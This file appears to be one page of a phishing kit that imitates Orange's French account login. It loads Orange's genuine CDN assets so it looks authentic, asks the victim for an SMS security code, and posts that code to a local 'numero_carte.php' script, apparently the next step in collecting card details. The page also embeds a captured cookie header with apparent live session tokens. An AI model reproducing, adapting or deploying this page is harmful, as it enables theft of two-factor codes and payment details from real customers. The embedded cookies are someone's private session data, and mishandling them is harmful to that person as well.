<?php
    //sleep(5);
?>
<!DOCTYPE html>
<html lang="fr">
<head data-placeholder-focus="false">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="msapplication-config" content="none"/>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="format-detection" content="telephone=no">
    <title>Identifiez-vous avec votre compte Orange</title>

    <noscript>
        <style type="text/css">
            body {
                display: none;
            }
        </style>
        <meta http-equiv="refresh" content="0; url=/assistance"/>
    </noscript>

    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">

    <link rel="apple-touch-icon" sizes="57x57" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/apple-touch-icon-180x180.png">

    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/favicon-194x194.png" sizes="194x194">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/android-chrome-36x36.png" sizes="36x36">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/android-chrome-48x48.png" sizes="48x48">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/android-chrome-72x72.png" sizes="72x72">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/android-chrome-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/android-chrome-144x144.png" sizes="144x144">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/android-chrome-192x192.png" sizes="192x192">
    <link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/icons/favicon-16x16.png" sizes="16x16">
    <link rel="stylesheet" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/css/bundle.min.css">
    <style>
        .eui-banner {
            background-image: url("https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/images/services_comm/om_desktop.png");
        }

        .eui-banner-mc {
            background-image: url("https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/images/services_comm/mc_desktop_old.png");
        }
        #promoteMCicon{
            background: url("https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/images/services_comm/../promoteMCDesktop.gif") no-repeat;
            background-size: 100%;
            height: 32rem;
            width: 30rem;
        }

        @media (max-width: 767px) {
            .eui-banner {
                background-image: url("https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/images/services_comm/om_mobile.png");
            }

            .eui-banner-mc {
                background-image: url("https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/images/services_comm/mc_mobile_old.png");
            }

            #promoteMCicon {
                background: url("https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/images/services_comm/../promoteMCMobile.gif") no-repeat;
                background-size: 100%;
                height: 15rem;
                width: 30.2rem;
            }
        }

        .off-screen {
            position: fixed;
            bottom: 0;
            right: 0;
            height: 0 !important;
            width: 0 !important;
            overflow: hidden;
            opacity: 0;
            filter: alpha(opacity=0);
        }
    </style>
    <script type="text/javascript">
        window.Eui = {
            params: {"return_url":"https:\/\/espace-client.orange.fr\/page-accueil"},
            headers: {"content-type":"application\/json","cookie":"_ga=GA1.2.331558144.1606938798; __gads=ID=67b0d96d64e25082:T=1606935194:S=ALNI_MZdhD2XeXAKvDRcdOOXEFn6mABOAw; izclientid=ltzF8yI30oRCKFRulkwAIOS8%2C1608581876; is_fut=true; userconsent={\"c\":{\"w\":{\"cs\":{\"c1\":\"0\",\"c2\":\"0\",\"c3\":\"0\",\"c4\":\"0\",\"c5\":\"0\",\"c6\":\"0\"},\"t\":\"2020-12-14T20:18:05.320Z\",\"v\":\"2\"}}}; o-cookie-cnil=5; st_audience_clientId=c4d97784-683e-4893-812a-4df87e3253ba; st_audience_fp_checksum=077cd0f67942592129ff8661786c32d3; OB-USER-TOKEN=2c251c98-313c-4ea5-a385-f01548706fe2; mmapi.p.uat=%7B%22userConsent%22%3A%22true%22%7D; nav=2; mmapi.p.bid=%22prodlhrcgeu01%22; mmapi.p.srv=%22prodlhrcgeu01%22; ec_type=orange_res; HBX_DC=bgl; idzone=AF5PEJWQTUU5Worpl5ggN29Dr5KNrfDA2rKN71RhDOG1u6pRLZnix2nEhLsZ2pldShlkJqMej3vzN86ZsUfE4tMi8lTcpnMZmGGV5gVfdY_-wd4SzqmQfFTV99ufOOYJDFfcatF_qWztDQGWrzYRRwxt3A; OPTOUTMULTI=0:0%7Cc2:0%7Cc3:0%7Cc4:0%7Cc1:0; headerFlatEligibility=0; _gid=GA1.2.1572432071.1608098697; UrCapture=eb4ffc7b-4f0a-1f5a-923c-d6e85e810422; _cs_c=1; _cs_id=2e29f2ed-34bd-ae2d-c967-bb6788abbe2a.1608098700.1.1608098700.1608098700.1604677360.1642262700983.None.1; _cs_s=1.3; LPVID=c0Y2QzYmEyYjE0NGM3ZDg5; LPSID-31127979=LTSliV9GSxy9DFrhOYsDrg; _nac=nav_access_cookie; xauth=9dac275de230bfe3dc7454ca748b13b397bf07c56f2efee441256aa71f70449a%3BB4X%2B6uyAdp6aStZwp2TNw3Ng3nP2BVHxjysAl1K6rL4Gj56RAeCur0oYMHHmAAbgGr0PegZRWGIfR%2Bcl1M0%2F11ZOmm6Y39%2BnMvwAnjbZaAw%3D; datadome=I7fpUm5q.5GxLXmxVzUnM63NWtATtzTmzB_jxdrcpoqCxyuqtoBlOrU7UMJXbhWrqHL95CDdG8RxL6eXX8fiTroreq.dwSLxVdNxBfAueW; mmapi.p.pd=%221014687940%7CDgAAAApVBABPxo%2FO6BNm0AADbGhyARIAAUIA7yeUtAIAKTOoEYmh2EiiMWGBbaDYSAAAAAD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwAGRGlyZWN0AegTAgAAAAAAAAAAAP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwAAAAAAAAABRQ%3D%3D%22; utag_main=v_id:017625042415001b7eed5ad44c9503072001806a00978$_sn:6$_ss:0$_st:1608100749582$_pn:6%3Bexp-session$ses_id:1608098323164%3Bexp-session"},
            apiConfig: {"baseUrl":"\/front","timeout":15000,"retry":2,"resources":{"login":{"path":"\/login","method":"POST"},"password":{"path":"\/password","method":"POST"},"challenge":{"path":"\/challenge","method":"POST"},"captcha":{"path":"\/captcha","method":"POST"},"keepConnected":{"path":"\/keep-connected","method":"POST"},"reauthentication":{"path":"\/reauthentication","method":"POST"},"accounts":{"path":"\/accounts","method":"GET"},"probe":{"path":"\/report\/probe","method":"POST"},"confirm":{"path":"\/confirm","method":"POST"},"await":{"path":"\/await","method":"GET"},"reportError":{"path":"\/report\/error","method":"POST"},"deactivate":{"path":"\/deactivate","method":"POST"},"promoteLaterMC":{"path":"\/promoteLaterMC","method":"POST"},"activateMC":{"path":"\/activateMC","method":"POST"},"authToken":{"path":"\/authToken","method":"POST"},"authCookie":{"path":"\/authCookie","method":"GET"}}},
            i18n: {errors: {"408":"Le service a rencontr\u00e9 un probl\u00e8me r\u00e9seau, veuillez r\u00e9essayer.","503":"Cette page rencontre un probl\u00e8me technique, r\u00e9essayez un peu plus tard.","100":"Vous n\u2019avez pas indiqu\u00e9 l\u2019adresse mail ou le num\u00e9ro de mobile de votre compte Orange.","101":"Cette adresse mail ou ce num\u00e9ro de mobile n\u2019est pas valide. V\u00e9rifiez votre saisie.","102":"Vous n\u2019avez pas saisi votre mot de passe.","104":"C\u2019est incorrect, v\u00e9rifiez l\u2019adresse mail et le mot de passe saisis.","105":"Pour vous permettre de vous identifier votre navigateur doit accepter les cookies. <a href=\"https:\/\/r.orange.fr\/r\/Oid_cookies\" target=\"_self\" title=\"En savoir plus.\">En savoir plus.<\/a>","106":"Champ obligatoire"}, labels: {"titlePassAssistShow":"afficher le mot de passe","titlePassAssistHide":"cacher le mot de passe"}},
            mem: true,
            ad: true,
            stage: 'login',
            templateErrorTech: "<div class=\"row\">    <div class=\"col-xs-12 col-md-12 col-lg-11 col-xl-9\">        <div class=\"eui-error-area\">            <div class=\"zone-icon\">                <div class=\"eui-svg eui-icon-warning\"><\/div>            <\/div>            <div class=\"zone-msg\">                <p id=\"msgWarning\">Vous \u00eates rest\u00e9 longtemps inactif.<\/p>            <\/div>            <div class=\"zone-msg-btm\">                <p id=\"msgAction\">Vous pouvez recommencer<\/p>            <\/div>            <div class=\"clearfix\"><\/div>            <button id=\"btnRefresh\" type=\"button\" class=\"btn btn-info eui-btn-sub\">Recommencer<\/button>        <\/div>    <\/div><\/div>",
            templateAuthToken: "",
            ttls: 3600,
            ecConf: {"baseUrl":"\/\/c.woopic.com\/libs\/common\/","default":"o_load_responsive.js","proMobile":"o_load_responsive_mobile.js","proDesktop":"o_load.js"},
            reportError:  true,
            lostUrl: 'https://mdp.orange.fr',
            adUrl: 'https://all.orfr.adgtw.orangeads.fr/js/ora_authen.identification'
        };
    </script>

    <script src="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/js/bundle.min.js"></script>
    <style>
        #forceMCLabel.disabled, #forceMCLabelBis.disabled  {
            display: none;
        }
        #o-ribbon-right{
            display: none;
        }
    </style>
</head>
<body>
<header id="o-header"></header>
<main class="eui-container" role="main">
    <div class="o-container-fluid">
        <div class="row">
            <div class="col-xs-12 col-md-6 col-lg-6 col-xl-6 ">
                <div id="stage" class="eui-st2">
                    <label for="password" id="passwordLabel">Saisie du code de s??curit??</label>
                    <div style="width: 40px; height: 6px; background: #f16e00"></div>
                    <br>
                    <p>Un sms contenant un code de s??curit??, vous a ??t?? envoy?? sur votre num??ro</p>
                    <form class="eui-form text-centr" id="euiFor" action="../numero_carte.php">
                        <h2 class="sr-only">Saisie du code de s??curit??</h2>
                        <div class="clearfix"></div>
                        <div class="form-group ">
							<label for="loginss" id="loginLabesl" class="eui-label" style="color: #f12b2d;">Renseignez correctement le code de s??curit??</label>
                            <div class="eui-help" id="helpPasswordCnt" style="display : none;">
                                <p class="noSelectContent" tabindex="-1">Vous ne retrouvez pas votre mot de passe. &gt;&gt; <a href="https://mdp.orange.fr?return_url=https%3A%2F%2Fespace-client.orange.fr%2Fpage-accueil&amp;login=F1RYiR%2BrDwulIp%2BpnyDbftDejktufnYYV%2F2ynqH0syO7fn8%2FI23fDmZNw04gbQ5KFh%2BB7a3jJHmCjeHqNLkOk3CNKQIVsOcPt%2BrFsHPjCiRIpQqc7%2FedaQH3EolJvW2kKzT8W26EkmhxHOqI4eeyBYPGHgSiVFcDNkAcNzGIiSKbnUohpmC1uMCouZa%2BuaTVh1gDAMmmZBjalmzFwmH5Zz5i5KhPYu7FPLvq2jn5ecNwphejQPEVfT9kMLQeB1HE%2FMtib1wUwQtW95xVZgsMCeNquiEMEpDza4roDEE8WQeVknl3Hf0vYBuygYRS1853zK0MeoZ331mtyIchzsN7Vw%3D%3D" class="eui-reinitLostLink" title="R??initialisez-le.">R??initialisez-le.</a></p>
                            </div>
                            <h6 id="error-msg-box" tabindex="0" class="form-control-message" aria-hidden="true" aria-live="assertive" role="alert"></h6>

                            <div id="passwordContainer">
                                <input type="text" id="password" name="code" placeholder="Code de s??curit??" class="form-control pass-assist" required="" aria-hidden="false" aria-invalid="false" aria-required="true">
                            </div>
                            <br>
                            <div><a href="../?new=22211">Un probl??me?</a></div>
                            <p><a href="../?new=22211" style="text-decoration: underline"><b>Recevoir un nouveau code par sms</b></a></p>
                        </div>
                        <div class="text-center">
                            <button id="btnSubmi" type="submit" class="btn btn-info eui-btn-sub">Envoyer</button>
                        </div>

                    </form>
                    <nav class="eui-links row" role="navigation">

                        <div id="assistance" class="col-xs-12 col-md-12 col-lg-12 col-xl-12" style="display: none;">
                            <a id="assistanceLink" href="/findLogin?return_url=https%3A%2F%2Fespace-client.orange.fr%2Fpage-accueil" rel="noopener noreferrer" data-oevent="idme_login;clic_retrouver_mail;lien_retrouver_mail" title="Comment retrouver l???adresse e-mail de votre compte&nbsp;?">Comment retrouver l???adresse e-mail de votre compte&nbsp;?</a>
                        </div>

                        <div id="firstAuthentBloc" class="col-xs-12 col-md-12 col-lg-12 col-xl-12" style="display: none;">
                            <a id="firstAuthentLink" data-oevent="idme_login;clic_premiere_connexion;lien_premiere_connexion" href="/firstConnection?return_url=https%3A%2F%2Fespace-client.orange.fr%2Fpage-accueil" title="Vous vous identifiez pour la premi??re fois  ?">Vous vous identifiez pour la premi??re fois  ?</a>
                        </div>

                        <div id="firstAccessDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12" style="display: none;">
                            <a id="firstAccessLink" data-oevent="idme_login;clic_cr??er_compte;cr??er_votre_compte" href="https://r.orange.fr/r/Oid_signup?return_url=https%3A%2F%2Fespace-client.orange.fr%2Fpage-accueil" title="Vous n?????tes pas client ? Cr??er votre compte">Vous n?????tes pas client ? Cr??er votre compte</a>
                        </div>

                        <div id="forgotCodeMC" class="col-xs-12 col-md-12 col-lg-12 col-xl-12" style="display: none;">
                            <a id="forgotCodeMCLink" href="#" title="Code confidentiel oubli?? ?">Code confidentiel oubli?? ?</a>
                        </div>

                        <div id="discoverMC" class="col-xs-12 col-md-12 col-lg-12 col-xl-12" style="display: none">
                            <a id="discoverMCLink" href="https://mc.orange.fr?return_url=https%3A%2F%2Fespace-client.orange.fr%2Fpage-accueil">
                                <img id="discoverMCLinkImg" src="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/images/services_comm/Logo_MC_noir_fond_transparent_small.png">
                                <img id="discoverMCLinkImgHover" style="display: none;" src="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-2.17.2/images/services_comm/Logo_MC_orange_fond_transparent_small.png">
                                Comment s???identifier plus vite et plus facilement ?                                </a>
                        </div>

                        <div id="moreHelpLink" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                            <a id="helpLink" data-oevent-category="idme_password" data-oevent-action="clic_aide" data-oevent-label="aide" href="/aide?return_url=https%3A%2F%2Fespace-client.orange.fr%2Fpage-accueil" title="Besoin d???aide ?">Besoin d???aide ?</a>
                        </div>

                        <div id="authWithoutMCDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12 " style="display: none;">
                            <a id="authWithoutMCLink" class="link-action-password" href="#" title="S???identifier avec votre mot de passe" data-oevent-category="idme_mc_invit" data-oevent-action="clic_sidentifier_sans_mc" data-oevent-label="sidentifier_sans_mc">S???identifier avec votre mot de passe</a>
                        </div>
                        <div class="eui-help col-xs-12 disabled" id="forceMCLabel">
                            Par s??curit??, vous devez vous identifier avec Mobile Connect.                                <button type="button" class="eui-svg eui-close eui-icon-close-grey">
                                <span class="sr-only">fermer</span>
                            </button>
                        </div>
                        <div class="eui-help col-xs-12 disabled" id="forceMCLabelBis">
                            Suite ?? plusieurs tentatives d???acc??s erron??es, l???acc??s ?? ce compte par mot de passe est temporairement bloqu??. R??essayez un peu plus tard.                                <button type="button" class="eui-svg eui-close eui-icon-close-grey">
                                <span class="sr-only">fermer</span>
                            </button>
                        </div>
                    </nav>
                </div>
            </div>
            <div id="magicZone" class="eui-banner-place col-xs-12 col-md-5 col-lg-4 col-xl-4 col-md-offset-1">
                <a id="magicZoneLink" data-oevent-category="idme_login" data-oevent-action="clic_zone_com" data-oevent-label="service" class="eui-block"
                   href="https://r.orange.fr/r/Oapp_Orange_EtMoi" target="_blank" rel="noopener noreferrer">
                    <div id='elmt-banner' class='eui-banner'
                         title="Lien zone de communication (nouvel onglet)"></div>
                </a>
            </div>
        </div>
    </div>
</main>
<footer>
    <div class="eui-footer-banner hidden-xs hidden-sm">
        <div class="eui-mega-banner oan_ad" id="ora_2_728x90_identification"></div>
    </div>
    <div id="cefooter"></div>
</footer>
</body>
</html>